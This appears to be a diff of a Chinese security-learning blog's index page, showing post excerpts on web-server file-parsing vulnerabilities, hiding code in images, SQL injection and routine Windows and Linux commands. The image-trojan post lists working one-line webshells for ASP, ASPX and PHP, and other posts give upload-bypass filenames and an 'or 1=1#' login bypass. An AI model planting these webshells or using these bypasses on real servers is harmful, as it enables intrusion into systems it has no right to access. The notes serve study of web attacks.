@@ -1,260 +1,443 @@
 <!DOCTYPE html>
-<html lang="en">
-
-<!-- Head tag -->
+<html>
 <head><meta name="generator" content="Hexo 3.8.0">
-
-    <meta charset="utf-8">
-    <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <meta name="viewport" content="width=device-width, initial-scale=1">
-
-    <!--Description-->
+  <meta charset="utf-8">
+  
+  <title>iatk&#39;s blog</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta property="og:type" content="website">
+<meta property="og:title" content="iatk&#39;s blog">
+<meta property="og:url" content="https://iatk.github.io/index.html">
+<meta property="og:site_name" content="iatk&#39;s blog">
+<meta property="og:locale" content="default">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="iatk&#39;s blog">
+  
+    <link rel="alternative" href="/atom.xml" title="iatk&#39;s blog" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/img/favicon.png">
+  
+  
+      <link rel="stylesheet" href="//cdn.bootcss.com/animate.css/3.5.0/animate.min.css">
+  
+  <link rel="stylesheet" href="/css/style.css">
+  <link rel="stylesheet" href="/font-awesome/css/font-awesome.min.css">
+  <link rel="apple-touch-icon" href="/apple-touch-icon.png">
+  
     
-
-    <!--Author-->
     
-        <meta name="author" content="iatk">
-    
-
-    <!--Open Graph Title-->
-    
-        <meta property="og:title" content="iatk&#39;s blog">
-    
-
-    <!--Open Graph Description-->
-    
-
-    <!--Open Graph Site Name-->
-    <meta property="og:site_name" content="iatk&#39;s blog">
-
-    <!--Type page-->
-    
-        <meta property="og:type" content="website">
-    
-
-    <!--Page Cover-->
-    
-
-    <meta name="twitter:card" content="summary">
-    
-
-    <!-- Title -->
-    
-    <title>iatk&#39;s blog</title>
-
-    <!-- Bootstrap Core CSS -->
-    <link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/bootstrap/4.0.0-alpha.2/css/bootstrap.min.css" integrity="sha384-y3tfxAZXuh4HwSYylfB+J125MxIs6mR5FOHamPBG064zB+AFeWH94NdvaCBm8qnd" crossorigin="anonymous">
-
-    <!-- Custom Fonts -->
-    <link href="//maxcdn.bootstrapcdn.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet" type="text/css">
-
-    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
-    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
-    <!--[if lt IE 9]>
-        <script src="//oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
-        <script src="//oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
-    <![endif]-->
-
-    <!-- Gallery -->
-    <link href="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.css" type="text/css" rel="stylesheet">
-
-    <!-- Custom CSS -->
-    <link rel="stylesheet" href="/css/style.css">
-
-    <!-- Google Analytics -->
-    
-
-
-</head>
-
-
+  
+  
+      <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  
+  <!-- 加载特效 -->
+    <script src="/js/pace.js"></script>
+    <link href="/css/pace/pace-theme-flash.css" rel="stylesheet">
+  <script>
+      var yiliaConfig = {
+          rootUrl: '/',
+          fancybox: true,
+          animate: true,
+          isHome: true,
+          isPost: false,
+          isArchive: false,
+          isTag: false,
+          isCategory: false,
+          open_in_new: false
+      }
+  </script>
+</head></html>
 <body>
+  <div id="container">
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+    <header id="header" class="inner">
+        <a href="/" class="profilepic">
+            
+            <img lazy-src="/img/head.jpg" class="js-avatar">
+            
+        </a>
 
-<div class="bg-gradient"></div>
-<div class="bg-pattern"></div>
+        <hgroup>
+          <h1 class="header-author"><a href="/" title="Hi Mate">iatk</a></h1>
+        </hgroup>
 
-<!-- Menu -->
-<!--Menu Links and Overlay-->
-<div class="menu-bg">
-    <div class="menu-container">
-        <ul>
-            
-            <li class="menu-item">
-                <a href="/">
-                    Home
-                </a>
-            </li>
-            
-            <li class="menu-item">
-                <a href="/archives">
-                    Archives
-                </a>
-            </li>
-            
-            <li class="menu-item">
-                <a href="/about.html">
-                    About
-                </a>
-            </li>
-            
-            <li class="menu-item">
-                <a href="/tags">
-                    Tags
-                </a>
-            </li>
-            
-            <li class="menu-item">
-                <a href="/categories">
-                    Categories
-                </a>
-            </li>
-            
-            <li class="menu-item">
-                <a href="/contact.html">
-                    Contact
-                </a>
-            </li>
-            
-        </ul>
-    </div>
-</div>
-
-<!--Hamburger Icon-->
-<nav>
-    <a href="#menu"></a>
-</nav>
-
-<div class="container">
-
-    <!-- Main Content -->
-    <div class="row">
-    <div class="col-sm-12">
-
-        <!--Title and Logo-->
-        <header>
-    <div class="logo">
-        <a href="/"><i class="logo-icon fa fa-cube" aria-hidden="true"></i></a>
         
-            <h1 id="main-title" class="title">iatk's blog</h1>
+        <p class="header-subtitle">我的第一个博客</p>
         
-    </div>
-</header>
+        
+        
+            <div id="switch-btn" class="switch-btn">
+                <div class="icon">
+                    <div class="icon-ctn">
+                        <div class="icon-wrap icon-house" data-idx="0">
+                            <div class="birdhouse"></div>
+                            <div class="birdhouse_holes"></div>
+                        </div>
+                        <div class="icon-wrap icon-ribbon hide" data-idx="1">
+                            <div class="ribbon"></div>
+                        </div>
+                        
+                        <div class="icon-wrap icon-link hide" data-idx="2">
+                            <div class="loopback_l"></div>
+                            <div class="loopback_r"></div>
+                        </div>
+                        
+                        
+                        <div class="icon-wrap icon-me hide" data-idx="3">
+                            <div class="user"></div>
+                            <div class="shoulder"></div>
+                        </div>
+                        
+                    </div>
+                    
+                </div>
+                <div class="tips-box hide">
+                    <div class="tips-arrow"></div>
+                    <ul class="tips-inner">
+                        <li>菜单</li>
+                        <li>标签</li>
+                        
+                        <li>友情链接</li>
+                        
+                        
+                        <li>关于我</li>
+                        
+                    </ul>
+                </div>
+            </div>
+        
 
-        <section class="main">
-            
+        <div id="switch-area" class="switch-area">
+            <div class="switch-wrap">
+                <section class="switch-part switch-part1">
+                    <nav class="header-menu">
+                        <ul>
+                        
+                            <li><a href="/Home">博客首页</a></li>
+                        
+                            <li><a href="/works">作品展示</a></li>
+                        
+                            <li><a href="/about">留言打卡</a></li>
+                        
+                            <li><a href="/FrontEndGuide">前端导航</a></li>
+                        
+                        </ul>
+                    </nav>
+                    <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fl mail" target="_blank" href="http://mail.qq.com/cgi-bin/qm_share?t=qm_mailme&email=PAkNDgsKBQ4MCnxNTRJfU1E" title="mail">mail</a>
+                            
+                                <a class="fl github" target="_blank" href="https://github.com/luuman" title="github">github</a>
+                            
+                                <a class="fl zhihu" target="_blank" href="#" title="zhihu">zhihu</a>
+                            
+                                <a class="fl weibo" target="_blank" href="#" title="weibo">weibo</a>
+                            
+                                <a class="fl google" target="_blank" href="#" title="google">google</a>
+                            
+                                <a class="fl twitter" target="_blank" href="#" title="twitter">twitter</a>
+                            
+                                <a class="fl linkedin" target="_blank" href="#" title="linkedin">linkedin</a>
+                            
+                        </ul>
+                    </nav>
+                </section>
                 
-<div class="post">
+                
+                <section class="switch-part switch-part2">
+                    <div class="widget tagcloud" id="js-tagcloud">
+                        
+                    </div>
+                </section>
+                
+                
+                
+                <section class="switch-part switch-part3">
+                    <div id="js-friends">
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://luuman.github.io/">name</a>
+                    
+                    </div>
+                </section>
+                
 
-    <div class="post-header index">
-        <h1 class="title">
-            <a href="/2019/04/27/解析漏洞/">
-                解析漏洞
-            </a>
-        </h1>
-        <div class="post-info">
-            
-                <span class="date">2019-04-27</span>
-            
-            
-            
+                
+                
+                <section class="switch-part switch-part4">
+                
+                    <div id="js-aboutme">纯海迷、爱运动、爱交友、爱旅行、喜欢接触新鲜事物、迎接新的挑战，更爱游离于错综复杂的编码与逻辑中</div>
+                </section>
+                
+            </div>
         </div>
+    </header>                
+</div>
     </div>
-
+    <div class="mid-col">
+      <nav id="mobile-nav">
+      <div class="overlay">
+          <div class="slider-trigger"></div>
+          <h1 class="header-author js-mobile-header hide"><a href="/" title="Me">iatk</a></h1>
+      </div>
+    <div class="intrude-less">
+        <header id="header" class="inner">
+            <a href="/" class="profilepic">
+                
+                    <img lazy-src="/img/head.jpg" class="js-avatar">
+                
+            </a>
+            <hgroup>
+              <h1 class="header-author"><a href="/" title="Me">iatk</a></h1>
+            </hgroup>
+            
+            <p class="header-subtitle">我的第一个博客</p>
+            
+            <nav class="header-menu">
+                <ul>
+                
+                    <li><a href="/Home">博客首页</a></li>
+                
+                    <li><a href="/works">作品展示</a></li>
+                
+                    <li><a href="/about">留言打卡</a></li>
+                
+                    <li><a href="/FrontEndGuide">前端导航</a></li>
+                
+                <div class="clearfix"></div>
+                </ul>
+            </nav>
+            <nav class="header-nav">
+                <div class="social">
+                    
+                        <a class="mail" target="_blank" href="http://mail.qq.com/cgi-bin/qm_share?t=qm_mailme&email=PAkNDgsKBQ4MCnxNTRJfU1E" title="mail">mail</a>
+                    
+                        <a class="github" target="_blank" href="https://github.com/luuman" title="github">github</a>
+                    
+                        <a class="zhihu" target="_blank" href="#" title="zhihu">zhihu</a>
+                    
+                        <a class="weibo" target="_blank" href="#" title="weibo">weibo</a>
+                    
+                        <a class="google" target="_blank" href="#" title="google">google</a>
+                    
+                        <a class="twitter" target="_blank" href="#" title="twitter">twitter</a>
+                    
+                        <a class="linkedin" target="_blank" href="#" title="linkedin">linkedin</a>
+                    
+                </div>
+            </nav>
+        </header>                
+    </div>
+</nav>
+      <div class="body-wrap">
+  
+    <article id="post-解析漏洞" class="article article-type-post" itemscope="" itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2019/04/27/解析漏洞/" class="article-date">
+      <time datetime="2019-04-27T12:08:01.000Z" itemprop="datePublished">2019-04-27</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
     
-        <div class="content">
-            <p>1、IIS6.0解析漏洞<br>①目录分析<br>形式：<a href="http://www.xxx.com/xx.asp/xx.jpg" target="_blank" rel="noopener">www.xxx.com/xx.asp/xx.jpg</a><br>原理：服务器默认会把xx.asp目录下的文件都会解析成asp文件。<br>②文件解析<br>形式：<a href="http://www.xxx.com/xx.asp;xx.jpg" target="_blank" rel="noopener">www.xxx.com/xx.asp;xx.jpg</a><br>原理：服务器默认不解析;号后面的内容，因此xx.asp;xx.jpg便被解析成asp文件。</p>
+      <input type="hidden" class="isFancy">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2019/04/27/解析漏洞/">解析漏洞</a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <p>1、IIS6.0解析漏洞<br>①目录分析<br>形式：<a href="http://www.xxx.com/xx.asp/xx.jpg" target="_blank" rel="noopener">www.xxx.com/xx.asp/xx.jpg</a><br>原理：服务器默认会把xx.asp目录下的文件都会解析成asp文件。<br>②文件解析<br>形式：<a href="http://www.xxx.com/xx.asp;xx.jpg" target="_blank" rel="noopener">www.xxx.com/xx.asp;xx.jpg</a><br>原理：服务器默认不解析;号后面的内容，因此xx.asp;xx.jpg便被解析成asp文件。</p>
 <p>2、Apache 1.x 2.x解析漏洞<br>漏洞原理：<br>Apache解析文件的规则是从右到左开始判断解析，如果后缀名为不可识别文件解析，就再往左判断，比如test.php.a.b的”.a”和”.b”这两种后缀是Apache不可识别解析，Apache就会把test.php.a.b解析成test.php。<br>漏洞形式：<a href="http://www.test.com/test.php.a" target="_blank" rel="noopener">www.test.com/test.php.a</a><br>其余配置问题导致漏洞：<br>(1)如果在Apache的conf里有这样一行配置 AddHandler php5-script.php 这时只要文件名里包含.php，即使文件名是 test.php.jpg 也会以php来执行。<br>(2)如果在Apache的conf里有这样一行配置 AddType Application/x-httpd-php.jpg 即使扩展名是jpg，一样能以php方式执行。</p>
 <p>3、Nginx解析漏洞<br>漏洞原理：<br>Nginx拿到文件路径（更专业的说法是URI）/test.jpg/test.php后，看到后缀是php，便认为该文件是php文件，转交给php处理。php看到/test.jpg/test.php不存在，便删去最后的test.php，又看到/test.jpg存在，便把/test.jpg当成要执行的文件了，又因为后缀为.jpg，php认为这不是php文件，于是返回“Access.denued”。<br>这其中涉及到php的一个选项：cgi.fix.pathinfo，该值默认为1，表示开启。开启这一选项PHP可以对文件路径进行“修理”。举个例子，当php遇到文件路径“/1.jpg/2.txt/3.php”是，若“/1.jpg/2.txt/3.php”不存在，则会去掉最后的“/3.php”，然后判断“/1.jpg/2.txt”是否存在，若存在，则把“/1.jpg/.2txt”<br>当作文件“/1.jpg/2.txt/3.php”，若“/1.jpg/.2txt”仍不存在，则继续去掉“/.2txt”，以此类推。<br>漏洞形式：<a href="http://www.xxx.com/UploadFiles/image/1.jpg/1.php" target="_blank" rel="noopener">www.xxx.com/UploadFiles/image/1.jpg/1.php</a><br>另外两种解析漏洞：<br><a href="http://www.xxx.com/UploadFiles/image/1.jpg%00.php" target="_blank" rel="noopener">www.xxx.com/UploadFiles/image/1.jpg%00.php</a><br><a href="http://www.xxx.com/UploadFiles/image/1.jpg/%20\0.php" target="_blank" rel="noopener">www.xxx.com/UploadFiles/image/1.jpg/%20\0.php</a></p>
 <p>4、IIS7.5解析漏洞<br>IIIS7.5的漏洞与Nginx的类似，都是由于php配置文件中，开启了cgi.fix.pathinfo，而这并不是Nginx或者IIS7.5本身的漏洞。<br>漏洞形式：<a href="http://www.xxx.com/UploadFiles/image/1.jpg/1.php" target="_blank" rel="noopener">www.xxx.com/UploadFiles/image/1.jpg/1.php</a></p>
 <p>5、Windows系统解析漏洞<br>旧版Windows Server中存在空格和dot漏洞，类似于”a.php.”和”a.php[空格]”这样的文件名存储后会被Windows去掉点和空格，从而使得加上这两个东西可以突破过滤，成功上传，并且被当作php代码执行。<br>例如：<br>test.asp.<br>test.asp(空格)</p>
 <p>test.php:1.jpg<br>test.php::$DATA</p>
 
-        </div>
-    
-
-</div>
-            
-                
-<div class="post">
-
-    <div class="post-header index">
-        <h1 class="title">
-            <a href="/2019/04/27/图片马制作/">
-                图片马制作的几种方式
-            </a>
-        </h1>
-        <div class="post-info">
-            
-                <span class="date">2019-04-27</span>
-            
-            
-            
-        </div>
+      
+      
     </div>
-
     
-        <div class="content">
-            <p>1、copy命令<br>CMD命令：<code>copy 1.jpg/b+1.php/a 2.jpg</code></p>
+    <div class="article-info article-info-index">
+      
+      
+
+      
+      
+      <div class="clearfix"></div>
+    </div>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+
+
+  
+    <article id="w-图片马制作" class="article article-type-w" itemscope="" itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2019/04/27/图片马制作/" class="article-date">
+      <time datetime="2019-04-27T11:43:54.000Z" itemprop="datePublished">2019-04-27</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2019/04/27/图片马制作/">图片马制作的几种方式</a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <p>1、copy命令<br>CMD命令：<code>copy 1.jpg/b+1.php/a 2.jpg</code></p>
 <p>2、PS软件<br>PS打开图片，在文件—&gt;文件简介里插入需要的木马代码，最后：文件—&gt;保存【保存：覆盖原文件，也可以另存为其他格式】。</p>
 <p>3、edjpg软件<br>将图片直接拖到<code>edjpg.exe</code>上，在弹出窗口内输入一句话木马即可。</p>
 <p>4、十六进制编辑器编辑添加<br>用010 Editor或winhex等十六进制编辑器打开图片，将一句话木马插入到右边最底层或最上层后保存。</p>
 <p>5、常见的一句话<br>asp一句话   <code>&lt;%eval request(&quot;pass&quot;)%&gt;</code><br>aspx一句话 <code>&lt;%@ Page Language=&quot;Jscript&quot;%&gt;&lt;%eval(Request.Item[&quot;pass&quot;],&quot;unsafe&quot;);%&gt;</code><br>php一句话  <code>&lt;?php @eval($_POST[&quot;pass&quot;]);?&gt;</code></p>
 
-        </div>
-    
-
-</div>
-            
-                
-<div class="post">
-
-    <div class="post-header index">
-        <h1 class="title">
-            <a href="/2019/04/13/python2与python3在Windows中共存/">
-                python2与python3在Windows中共存
-            </a>
-        </h1>
-        <div class="post-info">
-            
-                <span class="date">2019-04-13</span>
-            
-            
-            
-        </div>
+      
+      
     </div>
-
     
-        <div class="content">
-            <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>当电脑同时有python2和python3时，经常会出现各种令人抓狂的问题，好在终于把它解决了，特此记录一下。。。</p>
+    <div class="article-info article-info-index">
+      
+      
+
+      
+      
+      <div class="clearfix"></div>
+    </div>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+
+
+  
+    <article id="post-python2与python3在Windows中共存" class="article article-type-post" itemscope="" itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2019/04/13/python2与python3在Windows中共存/" class="article-date">
+      <time datetime="2019-04-13T13:45:32.000Z" itemprop="datePublished">2019-04-13</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2019/04/13/python2与python3在Windows中共存/">python2与python3在Windows中共存</a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>当电脑同时有python2和python3时，经常会出现各种令人抓狂的问题，好在终于把它解决了，特此记录一下。。。</p>
 <h3 id="重命名python"><a href="#重命名python" class="headerlink" title="重命名python"></a>重命名python</h3><p>首先C盘分别建一个python2和python3的文件夹，然后将python2和python3分别安装至对应的文件夹内（安装过程中都要勾选“Add Python.exe to Path“选项，两个版本的python可能描述不太一样，理解就行）。<br>关键的步骤：将python3文件夹内的<code>python.exe</code>和<code>pythonw.exe</code>分别改名为<code>python3.exe</code>和<code>pythonw3.exe</code>，也可以python3不动，修改python2文件夹内的两个exe程序的名字，总之两个python的exe程序不重名即可。在命令行内调用python：输入python会显示python2的版本信息，输入python3会显示python3的版本信息，成功~~</p>
 <h3 id="重新安装pip"><a href="#重新安装pip" class="headerlink" title="重新安装pip"></a>重新安装pip</h3><p>还有一个pip的问题同样令人头痛，解决办法：重新安装两个版本的pip。<br>在CMD命令框内输入命令：<br><code>python3-m pip install --upgrade pip --force-reinstall</code>，显示Successfully installed pip-19.0.3<br><code>python2-m pip install --upgrade pip --force-reinstall</code>，显示Successfully installed pip-19.0.3<br>现在通过pip2 -V 和 pip3 -V 查看两个版本的pip信息，以后只需运行pip2install XXX和pip3 install XXX即可安装各自的python包。<br>当然如果不想麻烦也可以使用Anaconda来解决环境问题，不过在我的电脑上启动实在太慢了索性放弃，最后感谢大佬的博客：<a href="https://www.cnblogs.com/thunderLL/p/6643022.html" target="_blank" rel="noopener">https://www.cnblogs.com/thunderLL/p/6643022.html</a></p>
 
-        </div>
-    
-
-</div>
-            
-                
-<div class="post">
-
-    <div class="post-header index">
-        <h1 class="title">
-            <a href="/2019/04/12/SQL注入/">
-                SQL注入
-            </a>
-        </h1>
-        <div class="post-info">
-            
-                <span class="date">2019-04-12</span>
-            
-            
-            
-        </div>
+      
+      
     </div>
-
     
-        <div class="content">
-            <h3 id="SQL注入漏洞原理："><a href="#SQL注入漏洞原理：" class="headerlink" title="SQL注入漏洞原理："></a>SQL注入漏洞原理：</h3><p>①有一个参数用户可控；<br>②服务器对该参数没有过滤或者过滤不严谨。<br>漏洞本质：将用户提交的数据当做代码执行，违背了“数据和代码分离”的原则。</p>
+    <div class="article-info article-info-index">
+      
+      
+
+      
+      
+      <div class="clearfix"></div>
+    </div>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+
+
+  
+    <article id="post-SQL注入" class="article article-type-post" itemscope="" itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2019/04/12/SQL注入/" class="article-date">
+      <time datetime="2019-04-12T00:30:16.000Z" itemprop="datePublished">2019-04-12</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2019/04/12/SQL注入/">SQL注入</a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <h3 id="SQL注入漏洞原理："><a href="#SQL注入漏洞原理：" class="headerlink" title="SQL注入漏洞原理："></a>SQL注入漏洞原理：</h3><p>①有一个参数用户可控；<br>②服务器对该参数没有过滤或者过滤不严谨。<br>漏洞本质：将用户提交的数据当做代码执行，违背了“数据和代码分离”的原则。</p>
 <h3 id="万能密码原理"><a href="#万能密码原理" class="headerlink" title="万能密码原理"></a>万能密码原理</h3><p>后台登陆语句为：<br><code>SELECT * FROM admin WHERE Username = &#39;user&#39; and Password = &#39;pass&#39;</code><br>由于只要结果不为空就返回真，也就是登陆成功。<br>因此，输入万能密码or 1=1#<br>构造后的语句拼接为：<br><code>SELECT * FROM admin WHERE Username = &#39;user&#39; or 1=1# and Password = &#39;pass&#39;</code><br>通过注释符#注释后面的语句，在or 1=1的基础结果为真恒成立</p>
 <h3 id="注入分类"><a href="#注入分类" class="headerlink" title="注入分类"></a>注入分类</h3><p>根据请求方式不同可分为：<br>GET方式请求注入<br>POST方式请求注入<br>差别：是否需要抓包</p>
 <p>根据SQL注入点的参数类型可分为：<br>整数型注入（int型）<br>字符型注入（char型）<br>根据反馈类型可分为以下常见几种：<br>基于显错<br>union类型<br>布尔类型<br>基于时间<br>根据是否回显：<br>显注：有回显，有报错，通常使用union联合查询<br>盲注：无回显或只有显示正常页面和不显示页面两种区别，内置结果要么输出，要么不输出，不会输出其他内容</p>
@@ -321,117 +504,229 @@
 <p>在http后面构造语句，是立即直接生效的<br>一次注入很容易被扫描工具扫描到<br>二阶注入</p>
 <p>先构造语句（有被转义字符的语句）<br>我们构造的恶意语句存入数据库<br>第二次构造语句（结合前面已经存入数据库的语句，成功。因为系统没有对已经存入数据库的数据做检查）<br>二次注入更加难以被发现<br>利用方式<br>攻击者在http请求中提交恶意输入<br>恶意输入保存在数据库中<br>攻击者提交第二次http请求<br>为处理第二次http请求，程序在检索存储在数据库中的恶意输入，构造SQL语句<br>若攻击成功，在第二次请求相应中返回结果<br>代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">reg $uname = addslashes($_POST[&apos;uname&apos;]);</span><br><span class="line">INSERT INTO `users` (`uname`,`upass`) VALUES ($uname, md5($upass));</span><br><span class="line">login $uname = addslashes($_POST[&apos;uname&apos;]);</span><br><span class="line">SELECT * FROM `users` WHERE `uname` = $uname;</span><br><span class="line">show message $_SESSION[&apos;uname&apos;] = $db[&apos;uname&apos;];</span><br><span class="line">SELECT * FROM `messages` WHERE &apos;uname&apos; = &apos;$_SESSION[&quot;uname&quot;]&apos;;</span><br><span class="line">uname = admin&apos; and sleep(5);</span><br></pre></td></tr></table></figure></p>
 
-        </div>
-    
-
-</div>
-            
-                
-<div class="post">
-
-    <div class="post-header index">
-        <h1 class="title">
-            <a href="/2019/04/10/CMD常用命令/">
-                CMD常用命令
-            </a>
-        </h1>
-        <div class="post-info">
-            
-                <span class="date">2019-04-10</span>
-            
-            
-            
-        </div>
+      
+      
     </div>
-
     
-        <div class="content">
-            <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>windows下的命令虽然不是经常用，但有些又是必须会的，每次用的时候就各种查资料，很浪费时间，不如整理一下以后用了也好翻阅。</p>
+    <div class="article-info article-info-index">
+      
+      
+
+      
+      
+      <div class="clearfix"></div>
+    </div>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+
+
+  
+    <article id="post-CMD常用命令" class="article article-type-post" itemscope="" itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2019/04/10/CMD常用命令/" class="article-date">
+      <time datetime="2019-04-10T13:15:21.000Z" itemprop="datePublished">2019-04-10</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2019/04/10/CMD常用命令/">CMD常用命令</a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>windows下的命令虽然不是经常用，但有些又是必须会的，每次用的时候就各种查资料，很浪费时间，不如整理一下以后用了也好翻阅。</p>
 <h3 id="控制台"><a href="#控制台" class="headerlink" title="控制台"></a>控制台</h3><p>1、进入某个盘   <code>D:  //进入D盘</code> <!--这个经常忘记，老是用cd命令。。--><br>2、查看目录   dir     <!--r如果需要查看隐藏文件或者更多操作，可以使用dir /? 来查看其他用法。注：其他命令也一样，如果不知道具体用法可以用“命令+/？”的方法查看说明--><br>3、创建目录和删除目录<br>创建目录：md 目录名（文件夹）<br>删除目录：rd   目录名（文件夹）<br>4、清除屏幕<br>cls   类似于linux下的clear<br>5、复制和移动文件（必须cd到文件目录下）<br>copy  文件   路径/文件名<br>move 文件   路径/文件名<br>xcopy -&gt;复制整个文件夹的内容  用法：xcopy+文件夹+目标文件夹+参数<br>6、删除文件<br>del  文件名  （这个是专门删除文件的，不能删除文件夹）<br>7、管理自身的路由转发表（增删改查）<br>route<br>8、查看主机存储的IP和MAC的映射<br>arp<br>9、查看当前进程列表<br>tasklist<br>10、查看进程<br>query<br>11、查看网络状态<br>netstat  （不间断输出，可以用CTRL+C中断）<br>12、网络配置<br>netsh （后面需要接参数）<br>13、查看计算机的用户<br>net user</p>
 <h3 id="WIN-R快捷键"><a href="#WIN-R快捷键" class="headerlink" title="WIN+R快捷键"></a>WIN+R快捷键</h3><p>1、远程连接<br>mstsc<br>2、配置启动项<br>msconfig<br>3、打开服务<br>services.msc<br>4、打开设备管理<br>devmgmt.msc<br>5、打开控制面板<br>control<br>6、打开注册表<br>regedit<br>7、打开删除程序的面板<br>appwiz.cpl<br>8、打开计算器<br>calc<br>9、新打开一个文本<br>notepad</p>
 
-        </div>
-    
-
-</div>
-            
-                
-<div class="post">
-
-    <div class="post-header index">
-        <h1 class="title">
-            <a href="/2019/04/10/4/">
-                apt-get remove与apt-get purge
-            </a>
-        </h1>
-        <div class="post-info">
-            
-                <span class="date">2019-04-10</span>
-            
-            
-            
-        </div>
+      
+      
     </div>
-
     
-        <div class="content">
-            <p>最近硬盘告急，仔细观察发现是虚拟机搞得鬼，开机之后硬盘容量就一直变小变小，最后只有400多M了。。。折腾了大半天也没搞出个所以来，最后只能含泪恢复快照，心疼搭了那么久的VPN。。。等以后研究明白再更新吧。不过在折腾过程中发现了两个相似的命令：<strong>apt-get remove与apt-get purge</strong></p>
+    <div class="article-info article-info-index">
+      
+      
+
+      
+      
+      <div class="clearfix"></div>
+    </div>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+
+
+  
+    <article id="post-4" class="article article-type-post" itemscope="" itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2019/04/10/4/" class="article-date">
+      <time datetime="2019-04-10T11:47:51.000Z" itemprop="datePublished">2019-04-10</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2019/04/10/4/">apt-get remove与apt-get purge</a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <p>最近硬盘告急，仔细观察发现是虚拟机搞得鬼，开机之后硬盘容量就一直变小变小，最后只有400多M了。。。折腾了大半天也没搞出个所以来，最后只能含泪恢复快照，心疼搭了那么久的VPN。。。等以后研究明白再更新吧。不过在折腾过程中发现了两个相似的命令：<strong>apt-get remove与apt-get purge</strong></p>
 <p>这两个命令可以说基本一样，但是还是有细微的差别，直接划重点：<br><strong>apt-get remove 会删除软件包而保留软件的配置文件<br>apt-get purge    会同时清除软件包和软件包的配置文件</strong><br>所以如果想要彻底删除软件包，就用    <strong>apt-get purge</strong>    吧~</p>
 
-        </div>
-    
-
-</div>
-            
-                
-<div class="post">
-
-    <div class="post-header index">
-        <h1 class="title">
-            <a href="/2019/03/30/3/">
-                MySQL中的substr函数与PHP中的substr函数
-            </a>
-        </h1>
-        <div class="post-info">
-            
-                <span class="date">2019-03-30</span>
-            
-            
-            
-        </div>
+      
+      
     </div>
-
     
-        <div class="content">
-            <h3 id="一"><a href="#一" class="headerlink" title="一"></a>一</h3><p><strong>MySQL–substr()</strong><br>    MySQL中的substr()函数是用来截取数据库某一列字段中的一部分<br>    常用方式是：<br>    <code>substr(str,pos);</code><br>    就是从pos开始的位置，一直截取到最后。<br>    <code>substr(str,pos,len);</code><br>    这种表示的意思是从pos开始的位置，截取len个字符（空白也算字符）。<br>    需要注意的是：如果pos为1（而不是0），表示从第一个开始。因为数据库的记录都是从1开始而没有从0开始<br>    博文原地址：<a href="https://www.cnblogs.com/quietwalk/p/6478900.html" target="_blank" rel="noopener">https://www.cnblogs.com/quietwalk/p/6478900.html</a></p>
+    <div class="article-info article-info-index">
+      
+      
+
+      
+      
+      <div class="clearfix"></div>
+    </div>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+
+
+  
